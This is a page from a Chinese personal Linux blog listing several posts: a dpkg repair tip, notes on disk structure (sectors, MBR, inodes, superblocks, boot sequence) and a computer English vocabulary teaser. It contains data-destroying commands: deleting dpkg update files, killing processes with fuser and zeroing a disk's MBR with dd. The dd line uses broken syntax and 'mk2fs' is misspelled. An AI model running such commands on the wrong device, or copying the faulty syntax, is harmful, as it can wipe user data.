fa-folder"></i> </span><span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/answer-question/" itemprop="url" rel="index"><span itemprop="name">answer&question</span></a></span></span></div></header><div class="post-body" itemprop="articleBody"><p>缺少依赖,安装 <strong>akonadi-backend-mysql</strong></p></div><footer class="post-footer"><div class="post-eof"></div></footer></article><article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://www.divint3.cn/%E8%A7%A3%E5%86%B3dpkg-configure-a-%E6%97%A0%E6%B3%95%E4%BF%AE%E5%A4%8D%E8%BD%AF%E4%BB%B6%E5%8C%85%E5%85%B3%E7%B3%BB%E7%9A%84%E9%97%AE%E9%A2%98/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/head.png"><meta itemprop="name" content="Divint3"><meta itemprop="description" content="おかわいいこと"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="HexBlog"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"><a href="/%E8%A7%A3%E5%86%B3dpkg-configure-a-%E6%97%A0%E6%B3%95%E4%BF%AE%E5%A4%8D%E8%BD%AF%E4%BB%B6%E5%8C%85%E5%85%B3%E7%B3%BB%E7%9A%84%E9%97%AE%E9%A2%98/" class="post-title-link" itemprop="url">解决dpkg --configure -a 无法修复软件包关系的问题</a></h2><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建时间：2019-05-14 21:17:46" itemprop="dateCreated datePublished" datetime="2019-05-14T21:17:46+08:00">2019-05-14</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar-check"></i> </span><span class="post-meta-item-text">更新于</span> <time title="修改时间：2020-06-08 20:21:50" itemprop="dateModified" datetime="2020-06-08T20:21:50+08:00">2020-06-08</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-folder"></i> </span><span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/answer-question/" itemprop="url" rel="index"><span itemprop="name">answer&question</span></a></span></span></div></header><div class="post-body" itemprop="articleBody"><p><strong>执行</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo rm /var/lib/dpkg/updates/*</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get upgrade</span><br></pre></td></tr></table></figure>如果提示有锁,则重启电脑,再次执行上述语句<div class="post-button"><a class="btn" href="/%E8%A7%A3%E5%86%B3dpkg-configure-a-%E6%97%A0%E6%B3%95%E4%BF%AE%E5%A4%8D%E8%BD%AF%E4%BB%B6%E5%8C%85%E5%85%B3%E7%B3%BB%E7%9A%84%E9%97%AE%E9%A2%98/#more" rel="contents">阅读全文 &raquo;</a></div></div><footer class="post-footer"><div class="post-eof"></div></footer></article><article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://www.divint3.cn/%E7%A1%AC%E7%9B%98%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/head.png"><meta itemprop="name" content="Divint3"><meta itemprop="description" content="おかわいいこと"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="HexBlog"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"><a href="/%E7%A1%AC%E7%9B%98%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/" class="post-title-link" itemprop="url">硬盘相关知识</a></h2><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建时间：2019-05-02 11:31:23" itemprop="dateCreated datePublished" datetime="2019-05-02T11:31:23+08:00">2019-05-02</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar-check"></i> </span><span class="post-meta-item-text">更新于</span> <time title="修改时间：2020-06-08 18:41:32" itemprop="dateModified" datetime="2020-06-08T18:41:32+08:00">2020-06-08</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-folder"></i> </span><span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/%E7%A1%AC%E4%BB%B6/" itemprop="url" rel="index"><span itemprop="name">硬件</span></a></span></span></div></header><div class="post-body" itemprop="articleBody"><h3 id="硬盘">硬盘</h3><h4 id="机械式硬盘">机械式硬盘</h4><p>由磁片,磁头构成,磁盘按扇区划分 机械式磁盘可以由多个磁盘片构成 每个磁盘片相同位置的扇区,每个大小512Byte构成的一个空心圆柱叫做柱面 为了实现快速数据读写,硬盘往往会多个磁头向多个磁盘片同时写入数据 同一个文件,会被写到多个磁盘片内</p><h4 id="低级格式化">低级格式化</h4><p>划分磁道,扇区</p><h4 id="磁道">磁道</h4><p>磁头在磁盘掠过的每个圆环叫一个磁道,每个磁道可以分成若干个扇区.</p><h4 id="扇区">扇区</h4><p>扇区,每个大小为512Byte,历史中的每个扇区的大小为512Byte,但是随着技术发展,大家约定俗成的扇区大小变成了4096Byte,但是为了兼容以前的操作系统,磁盘允许每个4096Byte扇区虚拟为八个512Byte,如果所有数据都是从4096Byte扇区的头512Byte开始写入,而不是从后3584Byte中开始写入,这叫做4K对齐 如果从后7个虚拟扇区开始写入,就叫做4K不对齐 4K对齐的好处很多,比如数据写入速度变快,因为扇区的大小越大,所形成的扇区数就明显变少,超过扇区大小的数据存储在多个块中时,所需要操作系统寻找的扇区变少,数据能更快的存储 如果仍然使用512为一块/簇,会造成写入速度极慢</p><h4 id="柱面">柱面</h4><p>每个硬盘都会有许多块磁片,可以同时写入,加快写入效率,缺点就是,一但有一片瓷片损坏,整个硬盘数据都会发生损坏,整个柱面都是不可用的</p><h4 id="块block">块/block</h4><p>windows中,存储数据以簇为单位,linux中,以块为单位(只是叫法不同,但是实际含义都是一个意思),系统中常常规定多少个扇区为一个簇(块),因为一个扇区的大小为512b,所以簇(块)必须为扇区的整数倍,常见的簇(块)大小为1024b,2048b,4096b(4k最常用) 每个块/簇由2^n倍的扇区构成</p><h4 id="主引导记录mbr">主引导记录mbr</h4><p>零磁道,零扇区 512Byte,叫做主引导记录 这个存储空间被划分为三个片段 446Byte:bootloader 启动器,一段代码程序,用于从分区中加载内核(kernel) 64Byte: 16Byte: 用于标识一个分区 最高四个分区,16Byte*4 2Byte: 魔数 标记mbr是否有效</p><h4 id="电脑的启动过程">电脑的启动过程</h4><p>主板加电,bios程序读入内存,cpu执行bios程序,bios自检程序完成后,加载用户定义的启动顺序 开始寻找磁盘上的mbr,当找到有效的mbr后,bios把mbr存储的bootloader加载入内存,bios程序退出,bootloader开始执行 找到预定的特定分区,寻找操作系统的内核,加载入内存,完成内核的解压缩,运行在内存上,bootloader退出,内核开始工作 内核被加载入特权级0的区域</p><p><a target="_blank" rel="noopener" href="http://huaqianlee.github.io/2015/08/21/Linux/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Linux%E5%90%AF%E5%8A%A8%E8%BF%87%E7%A8%8B/">深入理解Linux启动过程</a> <a target="_blank" rel="noopener" href="http://c.biancheng.net/view/1016.html">Linux内核的加载过程</a> <a target="_blank" rel="noopener" href="https://blog.51cto.com/linuxzj/1409882">initrd 和 initramfs</a></p><h4 id="扩展分区">扩展分区</h4><p>存储于硬盘mbr,存储一个指针指向另一个地址,用于绑定扩展分区</p><h4 id="分区">分区</h4><p>一个硬盘被分成若干个逻辑块,用标号进行标识分区,例如sdX</p><h4 id="高级格式化">高级格式化</h4><p>用于创建文件系统,mk2fs</p><h4 id="文件系统">文件系统</h4><p>也是程序的一种,他负责文件的增删改查 文件系统分为几个部分,磁盘引导,超级块,inode池,数据存储区</p><h4 id="inode">inode</h4><p>inode用于记录文件的一些属性,包括修改时间,创建时间,文件数据块的位置,硬链接数,权限,UID,GID等,但不记录文件名,文件名由文件夹记录 详细请下载linuxkernel 在include/linux struct inode结构体中有详细声明</p><h4 id="inode-table">inode table</h4><p>文件系统中专门分出用于存储inode文件的地方,inode文件每个大小一般为128Byte或256Byte,inode数量在创建文件系统时给出,按照一定比例生成inode,比如两个块一个inode</p><h4 id="位图bitmap">位图/Bitmap</h4><p>使用1/0来记录块是否被使用,使用inode的原因是,便于操作系统识别未使用过的系统资源,方便检索 block bitmap:记录块的使用情况 inode bitmap:记录inode的使用情况</p><h4 id="超级块super-block">超级块/Super Block</h4><p>开头的第一个byte是byte 0，从 byte 1024开始往后的一部分数据。超级块中的数据其实就是文件卷的控制信息部分，也可以说它是卷资源表，有关文件卷的大部分信息都保存在这里。例如：硬盘分区中每个block的大小、硬盘分区上一共有多少个block group、以及每个block group中有多少个inode.超级块存在备份,创建文件系统的时候被随机备份于若干块中,若分区superblock被破坏,可以使用备份块恢复</p><h4 id="vfs">vfs</h4><p>不同文件系统的协调器,给出了一个统一接口</p><h4 id="分区命令">分区命令</h4><p>fdisk 指定硬盘 m为操作方法</p><h4 id="安全卸载硬盘">安全卸载硬盘</h4><p>要先杀死所有在分区上运行着的程序</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fuser -mk 挂载点</span><br></pre></td></tr></table></figure><p></p><h4 id="重新分区">重新分区</h4><p>需要先把硬盘第一个分区(MBR)的所有信息清除</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dd</span> -<span class="keyword">if</span> /dev/zero -of 硬盘设备文件 bs=512 count=1</span><br></pre></td></tr></table></figure><p></p></div><footer class="post-footer"><div class="post-eof"></div></footer></article><article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://www.divint3.cn/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%B8%B8%E7%94%A8%E8%8B%B1%E8%AF%AD%E8%AF%8D%E6%B1%87/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/head.png"><meta itemprop="name" content="Divint3"><meta itemprop="description" content="おかわいいこと"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="HexBlog"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"><a href="/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%B8%B8%E7%94%A8%E8%8B%B1%E8%AF%AD%E8%AF%8D%E6%B1%87/" class="post-title-link" itemprop="url">计算机常用英语词汇</a></h2><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建时间：2019-04-20 11:37:38" itemprop="dateCreated datePublished" datetime="2019-04-20T11:37:38+08:00">2019-04-20</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar-check"></i> </span><span class="post-meta-item-text">更新于</span> <time title="修改时间：2020-06-08 20:21:50" itemprop="dateModified" datetime="2020-06-08T20:21:50+08:00">2020-06-08</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-folder"></i> </span><span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%8B%B1%E8%AF%AD/" itemprop="url" rel="index"><span itemprop="name">计算机英语</span></a></span></span></div></header><div class="post-body" itemprop="articleBody"><h2 id="这里大多数都是计算机英语如果想了解计算机科学力荐-crash-course-computer-science">这里大多数都是计算机英语,如果想了解计算机科学,力荐 <a target="_blank" rel="noopener" href="https://www.bilibili.com/video/av21376839">Crash Course Computer Science</a></h2><div class="post-button"><a class="btn" href="/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%B8%B8%E7%94%A8%E8%8B%B1%E8%AF%AD%E8%AF%8D%E6%B1%87/#more" rel="contents">阅读全文 &raquo;</a></div></div><footer class="post-footer"><div class="post-eof"></div></footer></article><nav class="pagination"><a class="extend prev" rel="prev" href="/page/10/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><span class="page-number current">11</span><a class="page-number" href="/page/12/">12</a><span class="space">&hellip;</span><a class="page-number" href="/page/14/">14</a><a class="extend next" rel="next" href="/page/12/"><i class="fa fa-angle-right" aria-label="下一页"></i></a></nav></div><script>window.addEventListener("tabs:register",()=>{let{activeClass:t}=CONFIG.comments;if(CONFIG.comments.storage&&(t=localStorage.getItem("comments_active")||t),t){let e=document.querySelector(`a[href="#comment-${t}"]`);e&&e.click()}}),CONFIG.comments.storage&&window.addEventListener("tabs:click",t=>{if(!t.target.matches(".tabs-comment .tab-content .tab-pane"))return;let e=t.target.classList[1];localStorage.setItem("comments_active",e)})</script></div><div class="toggle sidebar-toggle"><span class="toggle-line toggle-line-first"></span> <span class="toggle-line toggle-line-middle"></span> <span class="toggle-line toggle-line-last"></span></div><aside class="sidebar"><div class="sidebar-inner"><ul class="sidebar-nav motion-element"><li class="sidebar-nav-toc">文章目录</li><li class="sidebar-nav-overview">站点概览</li></ul><div class="post-toc-wrap sidebar-panel"></div><div class="site-overview-wrap sidebar-panel"><div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="site-author-image" itemprop="image" alt="Divint3" src="/images/head.png"><p class="site-author-name" itemprop="name">Divint3</p><div class="site-description" itemprop="description">おかわいいこと</div></div><div class="site-state-wrap motion-element"><nav class="site-state"><div class="site-state-item site-state-posts"><a href="/archives"><span class="site-state-item-count">131</span> <span class="site-state-item-name">日志</span></a></div><div class="site-state-item site-state-categories"><a href="/categories/"><span class="site-state-item-count">35</span> <span class="site-state-item-name">分类</span></a></div></nav></div></div><div name="music"><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=760533&auto=0&height=66"></iframe></div></div></aside><div id="sidebar-dimmer"></div></div></main><footer class="footer"><div class="footer-inner"><div class="copyright">&copy; <span itemprop="copyrightYear">2022</span> <span class="with-love"><i class="fa fa-heart"></i> </span><span class="author" itemprop="copyrightHolder">Divint3</span></div></div></footer></div><script src="/lib/anime.min.js"></script><script src="/lib/velocity/velocity.min.js"></script><script src="/lib/velocity/velocity.ui.min.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/pisces.js"></script><script src="/js/next-boot.js"></script><script src="/js/local-search.js"></script><script>document.querySelectorAll(".pdfobject-container").forEach(e=>{let t=e.dataset.target,a="#"+Object.entries({navpanes:0,toolbar:0,statusbar:0,pagemode:"thumbs",view:"FitH"}).map(([e,t])=>`${e}=${encodeURIComponent(t)}`).join("&"),i=`/lib/pdf/web/viewer.html?file=${encodeURIComponent(t)}${a}`;NexT.utils.supportsPDFs()?e.innerHTML=`<embed class="pdfobject" src="${t+a}" type="application/pdf" style="height: ${e.dataset.height};">`:e.innerHTML=`<iframe src="${i}" style="height: ${e.dataset.height};" frameborder="0"></iframe>`})</script><script>"undefined"==typeof MathJax?(window.MathJax={loader:{source:{"[tex]/amsCd":"[tex]/amscd","[tex]/AMScd":"[tex]/amscd"}},tex:{inlineMath:{"[+]":[["$","$"]]},tags:"ams"},options:{renderActions:{findScript:[10,e=>{document.querySelectorAll('script[type^="math/tex"]').forEach(t=>{const a=!!t.type.match(/; *mode=display/),n=new e.options.MathItem(t.textContent,e.inputJax[0],a),d=document.createTextNode("");t.parentNode.replaceChild(d,t),n.start={node:d,delim:"",n:0},n.end={node:d,delim:"",n:0},e.math.push(n)})},"",!1],insertedScript:[200,()=>{document.querySelectorAll("mjx-container").forEach(e=>{let t=e.parentNode;"li"===t.nodeName.toLowerCase()&&t.parentNode.classList.add("has-jax")})},"",!1]}}},function(){var e=document.createElement("script");e.src="https://cdn.bootcss.com/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML",e.defer=!0,document.head.appendChild(e)}()):(MathJax.startup.document.state(0),MathJax.texReset(),MathJax.typeset())</script>
        <style>
            [bg-lazy] {
                background-image: none !important;
                background-color: #eee !important;
            }
        </style>
        <script>
            window.imageLazyLoadSetting = {
                isSPA: false,
                preloadRatio: 1,
                processImages: null,
            };
        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(e){e.imageLazyLoadSetting.processImages=t;var n=e.imageLazyLoadSetting.isSPA,i=e.imageLazyLoadSetting.preloadRatio||1,r=o();function o(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(){n&&(r=o());for(var t,a=0;a<r.length;a++)0<=(t=(t=r[a]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(e.innerHeight*i||document.documentElement.clientHeight*i)&&function(){var t,e,n,i,o=r[a];e=function(){r=r.filter(function(t){return o!==t})},(t=o).hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,t.removeAttribute("data-original"),e&&e()},t.src!==i&&(n.src=i))}()}function a(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",a),e.addEventListener("resize",a),e.addEventListener("orientationchange",a)}(this);</script></body></html>